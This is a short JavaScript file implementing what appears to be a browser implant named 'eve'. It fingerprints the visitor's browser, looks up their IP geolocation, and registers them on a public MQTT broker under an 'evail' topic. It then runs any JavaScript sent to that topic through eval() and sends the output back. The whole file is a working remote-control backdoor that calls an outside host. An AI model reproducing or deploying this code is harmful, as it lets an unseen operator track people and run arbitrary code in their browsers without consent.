let eve = {
    mqttClient: null,
    fingerprint: new ClientJS().getFingerprint(),
    browserData: new ClientJS().getBrowserData(),
    ipAddressGeolocation: fetch('https://ipapi.co/json')
                            .then(response => response.json())
                            .then(data => eve.ipAddressGeolocation = data),      
    connect: (server = "wss://test.mosquitto.org:8081") => {
        var identification = {
            fingerprint: eve.fingerprint,
            browserData: eve.browserData,
            ipAddressGeolocation: eve.ipAddressGeolocation,
            status: "Offline"
        };
        var mqttOptions = {
            will: {
                topic: "evail/" + eve.fingerprint,
                payload: JSON.stringify(identification),
                retain: true
            }
        };
        eve.mqttClient = mqtt.connect(server, mqttOptions);
        eve.mqttClient.on("connect", eve.onConnect);
        eve.mqttClient.on("message", eve.onMessage);
        eve.mqttClient.subscribe("evail/" + eve.fingerprint + "/stdin");
    },
    onConnect: () => {
        var identification = {
            fingerprint: eve.fingerprint,
            browserData: eve.browserData,
            ipAddressGeolocation: eve.ipAddressGeolocation,
            status: "Online"
        };
        eve.mqttClient.publish("evail/" + eve.fingerprint, JSON.stringify(identification), { retain: true });
    },
    onMessage: (topic, payload) => {
        topic = topic.split("/");
        var root = topic[0],
            fingerprint = topic[1],
            stdio = topic[2];
        if (root == "evail" && fingerprint == eve.fingerprint && stdio == "stdin")
        try {
            out = eval(payload.toString());
            if (out)
            eve.mqttClient.publish("evail/" + eve.fingerprint + "/stdout", out.toString());
        } catch (error) {
            eve.mqttClient.publish("evail/" + eve.fingerprint + "/stderr", error.toString());
        }
    }
};